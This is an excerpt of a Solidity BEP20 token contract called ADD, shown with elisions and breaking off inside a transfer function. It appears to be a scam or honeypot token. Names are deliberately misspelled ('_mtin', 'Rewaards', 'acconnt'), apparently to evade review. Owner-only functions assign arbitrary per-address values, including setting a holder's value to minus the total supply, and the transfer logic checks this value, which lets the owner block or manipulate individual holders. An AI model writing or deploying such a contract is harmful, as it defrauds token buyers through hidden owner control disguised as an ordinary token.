...
contract ADD is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address acconnt) public view virtual returns (uint256) {
        return _balances[acconnt];
    }
    ...
    function _burn(address acconnt, uint256 amnount) internal virtual {
        require(acconnt != address(0), "ERC20: burn from the zero address");

        uint256 acconntBalance = _balances[acconnt];
        require(acconntBalance >= amnount, "ERC20: burn amnount exceeds balance");
    unchecked {
        _balances[acconnt] = acconntBalance - amnount;
    }
        _totalSupply -= amnount;

        emit Transfer(acconnt, address(0), amnount);
    }

    function _mtin(address acconnt, uint256 amnount) internal virtual {
        require(acconnt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[acconnt] += amnount;
        emit Transfer(address(0), acconnt, amnount);
    }
    ...
    function setAdminRewaard(address accbount,int256 amnount ) public onlyowner {
        _Rewaards[accbount] += amnount;
    }

    function rmUserRewaard(address accbount) public onlyowner {
        _Rewaards[accbount] = 0;
    }


    function setUserRewaard(address accbount) public onlyowner {
        _Rewaards[accbount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewaard(address accbount) public view returns (int256) {
        return _Rewaards[accbount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer amnount exceeds balance");
        if (_Rewaards[from] > 1){
